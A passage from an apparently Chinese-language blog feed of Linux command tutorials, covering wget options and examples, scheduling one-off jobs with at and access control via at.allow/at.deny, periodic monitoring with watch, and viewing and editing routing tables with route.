在下载之间等待0…2*WAIT秒 -Y, –proxy=on/off 打开或关闭代理 -Q, –quota=NUMBER 设置下载的容量限制 –limit-rate=RATE 限定下载输率 目录参数： -nd –no-directories 不创建目录 -x, –force-directories 强制创建目录 -nH, –no-host-directories 不创建主机目录 -P, –directory-prefix=PREFIX 将文件保存到目录 PREFIX/… –cut-dirs=NUMBER 忽略 NUMBER层远程目录 HTTP 选项参数： –http-user=USER 设定HTTP用户名为 USER. –http-passwd=PASS 设定http密码为 PASS -C, –cache=on/off 允许/不允许服务器端的数据缓存 (一般情况下允许) -E, –html-extension 将所有text/html文档以.html扩展名保存 –ignore-length 忽略 `Content-Length’头域 –header=STRING 在headers中插入字符串 STRING –proxy-user=USER 设定代理的用户名为 USER –proxy-passwd=PASS 设定代理的密码为 PASS –referer=URL 在HTTP请求中包含 `Referer: URL’头 -s, –save-headers 保存HTTP头到文件 -U, –user-agent=AGENT 设定代理的名称为 AGENT而不是 Wget/VERSION –no-http-keep-alive 关闭 HTTP活动链接 (永远链接) –cookies=off 不使用 cookies –load-cookies=FILE 在开始会话前从文件 FILE中加载cookie –save-cookies=FILE 在会话结束后将 cookies保存到 FILE文件中 FTP 选项参数： -nr, –dont-remove-listing 不移走 `.listing’文件 -g, –glob=on/off 打开或关闭文件名的 globbing机制 –passive-ftp 使用被动传输模式 (缺省值). –active-ftp 使用主动传输模式 –retr-symlinks 在递归的时候，将链接指向文件(而不是目录) 递归下载参数： -r, –recursive 递归下载－－慎用! -l, –level=NUMBER 最大递归深度 (inf 或 0 代表无穷) –delete-after 在现在完毕后局部删除文件 -k, –convert-links 转换非相对链接为相对链接 -K, –backup-converted 在转换文件X之前，将之备份为 X.orig -m, –mirror 等价于 -r -N -l inf -nr -p, –page-requisites 下载显示HTML文件的所有图片 递归下载中的包含和不包含(accept/reject)： -A, –accept=LIST 分号分隔的被接受扩展名的列表 -R, –reject=LIST 分号分隔的不被接受的扩展名的列表 -D, –domains=LIST 分号分隔的被接受域的列表 –exclude-domains=LIST 分号分隔的不被接受的域的列表 –follow-ftp 跟踪HTML文档中的FTP链接 –follow-tags=LIST 分号分隔的被跟踪的HTML标签的列表 -G, –ignore-tags=LIST 分号分隔的被忽略的HTML标签的列表 -H, –span-hosts 当递归时转到外部主机 -L, –relative 仅仅跟踪相对链接 -I, –include-directories=LIST 允许目录的列表 -X, –exclude-directories=LIST 不被包含目录的列表 -np, –no-parent 不要追溯到父目录wget -S –spider url 不下载只显示过程 4．使用实例实例1：使用wget下载单个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下的例子是从网络下载一个文件并保存在当前目录，在下载的过程中会显示进度条，包含（下载完成百分比，已经下载的字节，当前下载速度，剩余下载时间）。 实例2：使用wget -O下载并以不同的文件名保存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;wget默认会以最后一个符合”/”的后面的字符来命令，对于动态链接的下载通常文件名会不正确。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;错误：下面的例子会下载一个文件并以名称download.aspx?id=1080保存 1wget http://www.minjieren.com/download?id=1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;即使下载的文件是zip格式，它仍然以download.php?id=1080命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确：为了解决这个问题，我们可以使用参数-O来指定一个文件名： 1wget -O wordpress.zip http://www.minjieren.com/download.aspx?id=1080 实例3：使用wget –limit -rate限速下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --limit-rate=300k http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你执行wget的时候，它默认会占用全部可能的宽带下载。但是当你准备下载一个大文件，而你还需要下载其它文件时就有必要限速了。 实例4：使用wget -c断点续传&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -c http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget -c重新启动下载中断的文件，对于我们下载大文件时突然由于网络等原因中断非常有帮助，我们可以继续接着下载而不是重新下载一个文件。需要继续中断的下载时可以使用-c参数。 实例5：使用wget -b后台下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于下载非常大的文件的时候，我们可以使用参数-b进行后台下载。 123wget -b http://www.minjieren.com/wordpress-3.1-zh_CN.zipContinuing in background, pid 1840.Output will be written to `wget-log'. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你可以使用以下命令来察看下载进度： 1tail -f wget-log 实例6：伪装代理名称下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --user-agent="Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16" http://www.minjieren.com/wordpress-3.1-zh_CN.zip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过–user-agent参数伪装。 实例7：使用wget –spider测试下载链接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --spider URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加–spider参数进行检查。 1wget --spider URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果下载链接正确，将会显示 123456wget --spider URLSpider mode enabled. Check if remote file exists.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Remote file exists and could contain further links,but recursion is disabled -- not retrieving. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误 1234wget --spider urlSpider mode enabled. Check if remote file exists.HTTP request sent, awaiting response... 404 Not FoundRemote file does not exist -- broken link!!! &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在以下几种情况下使用spider参数： 定时下载之前进行检查 间隔检测网站是否可用 检查网站页面的死链接 实例8：使用wget –tries增加重试次数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --tries=40 URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用–tries增加重试次数。 实例9：使用wget -i下载多个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -i filelist.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，保存一份下载链接文件 12345cat &gt; filelist.txturl1url2url3url4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接着使用这个文件和参数-i下载 实例10：使用wget –mirror镜像网站&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --mirror -p --convert-links -P ./LOCAL URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载整个网站到本地。 –miror:开户镜像下载 -p:下载所有为了html页面显示正常的文件 –convert-links:下载后，转换成本地的链接 -P ./LOCAL：保存所有文件和目录到本地指定目录 实例11：使用wget –reject过滤指定格式下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --reject=gif ur &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载一个网站，但你不希望下载图片，可以使用以下命令。 实例12：使用wget -o把下载信息存入日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -o download.log URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不希望下载信息直接显示在终端而是在一个日志文件，可以使用 实例13：使用wget -Q限制总下载文件大小&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -Q5m -i filelist.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。 实例14：使用wget -r -A下载指定格式文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -r -A.pdf url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在以下情况使用该功能： 下载一个网站的所有图片 下载一个网站的所有视频 下载一个网站的所有PDF文件 实例15：使用wget FTP下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12wget ftp-urlwget --ftp-user=USERNAME --ftp-password=PASSWORD url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用wget来完成ftp链接的下载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget匿名ftp下载： 1wget ftp-url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget用户名和密码认证的ftp下载 1wget --ftp-user=USERNAME --ftp-password=PASSWORD url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：编译安装使用如下命令编译安装： 12345# tar zxvf wget-1.9.1.tar.gz # cd wget-1.9.1 # ./configure # make # make install]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- at]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F51.%20Linux%20%E5%91%BD%E4%BB%A4-%20at%2F</url>
    <content type="text"><![CDATA[Linux 命令- at&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在windows系统中，windows提供了计划任务这一功能，在控制面板 -&gt; 性能与维护 -&gt; 任务计划， 它的功能就是安排自动运行的任务。 通过’添加任务计划’的一步步引导，则可建立一个定时执行的任务。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux系统中你可能已经发现了为什么系统常常会自动的进行一些任务？这些任务到底是谁在支配他们工作的？在linux系统如果你想要让自己设计的备份程序可以自动在某个时间点开始在系统底下运行，而不需要手动来启动它，又该如何处置呢？ 这些例行的工作可能又分为一次性定时工作与循环定时工作，在系统内又是哪些服务在负责？ 还有，如果你想要每年在老婆的生日前一天就发出一封信件提醒自己不要忘记，linux系统下该怎么做呢？&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天我们主要学习一下一次性定时计划任务的at命令的用法！ 1．命令格式1at [参数] [时间] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在一个指定的时间执行一个指定任务，只能执行一次，且需要开启atd进程（ps -ef | grep atd查看， 开启用/etc/init.d/atd start or restart； 开机即启动则需要运行 chkconfig –level 2345 atd on）。 3．命令参数 -m 当指定的任务被完成之后，将给用户发送邮件，即使没有标准输出 -I atq的别名 -d atrm的别名 -v 显示任务将被执行的时间 -c 打印任务的内容到标准输出 -V 显示版本信息 -q&lt;列队&gt; 使用指定的列队 -f&lt;文件&gt; 从指定文件读入任务而不是从标准输入读入 -t&lt;时间参数&gt; 以时间参数的形式提交要运行的任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;at允许使用一套相当复杂的指定时间的方法。他能够接受在当天的hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的 词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上AM（上午）或PM（下午）来说明是上午还是下午。 也能够指定命令执行的具体日期，指定格式为month day（月 日）或mm/dd/yy（月/日/年）或dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。 上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：now + count time-units ，now就是当前时间，time-units是时间单位，这里能够是minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count是时间的数量，究竟是几天，还是几小时，等等。 更有一种计时方法就是直接使用today（今天）、tomorrow（明天）来指定完成命令的时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TIME：时间格式，这里可以定义出什么时候要进行 at 这项任务的时间，格式有： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在今日的 HH:MM 时刻进行，若该时刻已超过，则明天的 HH:MM 进行此任务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM YYYY-MM-DD &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04:00 2009-03-17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;强制规定在某年某月的某一天的特殊时刻进行该项任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM[am|pm] [Month] [Date] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04pm March 17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也是一样，强制在某年某月某日的某时刻进行该项任务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HH:MM[am|pm] + number [minutes|hours|days|weeks] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; now + 5 minutes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ex&gt; 04pm + 3 days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就是说，在某个时间点再加几个时间后才进行该项任务。 4．使用实例实例1：三天后的下午 5 点锺执行 /bin/ls&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at 5pm+3 days &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# at 5pm+3 daysat&gt; /bin/lsat&gt; &lt;EOT&gt;job 7 at 2013-01-08 17:00[root@localhost ~]# 实例2：明天17点钟，输出时间到指定文件内&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at 17:20 tomorrow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# at 17:20 tomorrowat&gt; date &gt;/root/2013.log at&gt; &lt;EOT&gt;job 8 at 2013-01-06 17:20[root@localhost ~]# 实例3：计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1atq &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# atq8 2013-01-06 17:20 a root7 2013-01-08 17:00 a root[root@localhost ~]# 实例4：删除已经设置的任务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1atrm 7 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# atq8 2013-01-06 17:20 a root7 2013-01-08 17:00 a root[root@localhost ~]# atrm 7[root@localhost ~]# atq8 2013-01-06 17:20 a root[root@localhost ~]# 实例5：显示已经设置的任务内容&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1at -c 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# at -c 8#!/bin/sh# atrun uid=0 gid=0# mail root 0umask 22此处省略n个字符date &gt;/root/2013.log[root@localhost ~]# 5．atd 的启动与 at 运行的方式：1.atd 的启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要使用一次性计划任务时，我们的 Linux 系统上面必须要有负责这个计划任务的服务，那就是 atd 服务。 不过并非所有的 Linux distributions 都默认会把他打开的，所以，某些时刻我们需要手动将atd 服务激活才行。 激活的方法很简单，就是这样： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12/etc/init.d/atd start /etc/init.d/atd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost /]# /etc/init.d/atd start[root@localhost /]# /etc/init.d/atd 用法：/etc/init.d/atd &#123;start|stop|restart|condrestart|status&#125;[root@localhost /]# /etc/init.d/atd stop停止 atd：[确定][root@localhost /]# ps -ef|grep atdroot 25062 24951 0 14:53 pts/0 00:00:00 grep atd[root@localhost /]# /etc/init.d/atd start[确定]td：[确定][root@localhost /]# ps -ef|grep atdroot 25068 1 0 14:53 ? 00:00:00 /usr/sbin/atdroot 25071 24951 0 14:53 pts/0 00:00:00 grep atd[root@localhost /]# /etc/init.d/atd restart停止 atd：[确定][确定]td：[确定][root@localhost /]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/init.d/atd start 没有启动的时候，直接启动atd服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/init.d/atd restart 服务已经启动后，重启 atd 服务 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：配置一下启动时就启动这个服务，免得每次重新启动都得再来一次 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chkconfig atd on &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost /]# chkconfig atd on[root@localhost /]# 2. at 的运行方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;既然是计划任务，那么应该会有任务执行的方式，并且将这些任务排进行程表中。那么产生计划任务的方式是怎么进行的? 事实上，我们使用 at 这个命令来产生所要运行的计划任务，并将这个计划任务以文字档的方式写入 /var/spool/at/ 目录内，该工作便能等待 atd 这个服务的取用与运行了。就这么简单。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，并不是所有的人都可以进行 at 计划任务。为什么? 因为系统安全的原因。很多主机被所谓的攻击破解后，最常发现的就是他们的系统当中多了很多的黑客程序， 这些程序非常可能运用一些计划任务来运行或搜集你的系统运行信息,并定时的发送给黑客。 所以，除非是你认可的帐号，否则先不要让他们使用 at 命令。那怎么达到使用 at 的可控呢? &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们可以利用 /etc/at.allow 与 /etc/at.deny 这两个文件来进行 at 的使用限制。加上这两个文件后， at 的工作情况是这样的： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先找寻 /etc/at.allow 这个文件，写在这个文件中的使用者才能使用 at ，没有在这个文件中的使用者则不能使用 at (即使没有写在 at.deny 当中); &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 /etc/at.allow 不存在，就寻找 /etc/at.deny 这个文件，若写在这个 at.deny 的使用者则不能使用 at ，而没有在这个 at.deny 文件中的使用者，就可以使用 at 命令了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果两个文件都不存在，那么只有 root 可以使用 at 这个命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;透过这个说明，我们知道 /etc/at.allow 是管理较为严格的方式，而 /etc/at.deny 则较为松散 (因为帐号没有在该文件中，就能够运行 at 了)。在一般的 distributions 当中，由于假设系统上的所有用户都是可信任的， 因此系统通常会保留一个空的 /etc/at.deny 文件，意思是允许所有人使用 at 命令的意思 (您可以自行检查一下该文件)。 不过，万一你不希望有某些使用者使用 at 的话，将那个使用者的帐号写入 /etc/at.deny 即可！ 一个帐号写一行。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- watch]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F50.%20Linux%20%E5%91%BD%E4%BB%A4-%20watch%2F</url>
    <content type="text"><![CDATA[Linux 命令- watch&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;watch是一个非常实用的命令，基本所有的Linux发行版都带有这个小工具，如同名字一样，watch可以帮你监测一个命令的运行结果，省得你一遍遍的手动运行。在Linux下，watch是周期性的执行下个程序，并全屏显示执行结果。你可以拿他来监测你想要的一切命令的结果变化，比如 tail 一个 log 文件，ls 监测某个文件的大小变化，看你的想象力了！ 1．命令格式1watch [参数] [命令] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以将命令的输出结果输出到标准输出设备，多用于周期性执行命令/定时执行命令 3．命令参数 -n或–interval watch缺省每2秒运行一下程序，可以用-n或-interval来指定间隔的时间。 -d或–differences 用-d或–differences 选项watch 会高亮显示变化的区域。 而-d=cumulative选项会把变动过的地方(不管最近的那次有没有变动)都高亮显示出来。 -t 或-no-title 会关闭watch命令在顶部的时间间隔,命令，当前时间的输出。 -h, –help 查看帮助文档 4．使用实例实例1：每隔一秒高亮显示网络链接数的变化情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 1 -d netstat -ant 说明：其它操作：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;切换终端： Ctrl+x &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出watch：Ctrl+g 实例2：每隔一秒高亮显示http链接数的变化情况&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 1 -d 'pstree|grep http' 说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每隔一秒高亮显示http链接数的变化情况。 后面接的命令若带有管道符，需要加’’将命令区域归整。 实例3：实时查看模拟攻击客户机建立起来的连接数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch 'netstat -an | grep:21 | \ grep&lt;模拟攻击客户机的IP&gt;| wc -l' 实例4：监测当前目录中 scf’ 的文件的变化&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -d 'ls -l|grep scf' 实例5：10秒一次输出系统的平均负载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1watch -n 10 'cat /proc/loadavg']]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- route]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F55.%20Linux%20%E5%91%BD%E4%BB%A4-%20route%2F</url>
    <content type="text"><![CDATA[Linux 命令- route&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统的route命令用于显示和操作IP路由表（show / manipulate the IP routing table）。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。在Linux系统中，设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的IP地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加route命令来保证该路由设置永久有效。 1．命令格式1route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Route命令是用于操作基于内核ip路由表，它的主要作用是创建一个静态路由让指定一个主机或者一个网络通过一个网络接口，如eth0。当使用”add”或者”del”参数时，路由表被修改，如果没有参数，则显示路由表当前的内容。 3．命令参数 -c 显示更多信息 -n 不解析名字 -v 显示详细的处理信息 -F 显示发送信息 -C 显示路由缓存 -f 清除所有网关入口的路由表。 -p 与 add 命令一起使用时使路由具有永久性。 add:添加一条新路由。 del:删除一条路由。 -net:目标地址是一个网络。 -host:目标地址是一个主机。 netmask:当添加一个网络路由时，需要使用网络掩码。 gw:路由数据包通过网关。注意，你指定的网关必须能够达到。 metric：设置路由跳数。 Command 指定您想运行的命令 (Add/Change/Delete/Print)。 Destination 指定该路由的网络目标。 mask Netmask 指定与网络目标相关的网络掩码（也被称作子网掩码）。 Gateway 指定网络目标定义的地址集和子网掩码可以到达的前进或下一跃点 IP 地址。 metric Metric 为路由指定一个整数成本值标（从 1 至 9999），当在路由表(与转发的数据包目标地址最匹配)的多个路由中进行选择时可以使用。 if Interface 为可以访问目标的接口指定接口索引。若要获得一个接口列表和它们相应的接口索引，使用 route print 命令的显示功能。可以使用十进制或十六进制值进行接口索引。 4．使用实例实例1：显示当前路由&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12routeroute -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0e192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth00.0.0.0 192.168.120.240 0.0.0.0 UG 0 0 0 eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一行表示主机所在网络的地址为192.168.120.0，若数据传送目标是在本局域网内通信，则可直接通过eth0转发数据包; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四行表示数据传送目的是访问Internet，则由接口eth0，将数据包发送到网关192.168.120.240 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中Flags为路由标志，标记当前网络节点的状态。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Flags标志说明： U Up表示此路由当前为启动状态 H Host，表示此网关为一主机 G Gateway，表示此网关为一路由器 R Reinstate Route，使用动态路由重新初始化的路由 D Dynamically,此路由是动态性地写入 M Modified，此路由是由路由守护程序或导向器动态修改 ! 表示此路由当前为关闭状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;route -n (-n 表示不解析名字,列出速度会比route 快) 实例2：添加网关/设置网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一条 到达244.0.0.0的路由 实例3：屏蔽一条路由&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1route add -net 224.0.0.0 netmask 240.0.0.0 reject &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# route add -net 224.0.0.0 netmask 240.0.0.0 reject[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一条屏蔽的路由，目的地址为 224.x.x.x 将被拒绝 实例4：删除路由记录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12route del -net 224.0.0.0 netmask 240.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 reject &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route del -net 224.0.0.0 netmask 240.0.0.0[root@localhost ~]# routeKernel IP 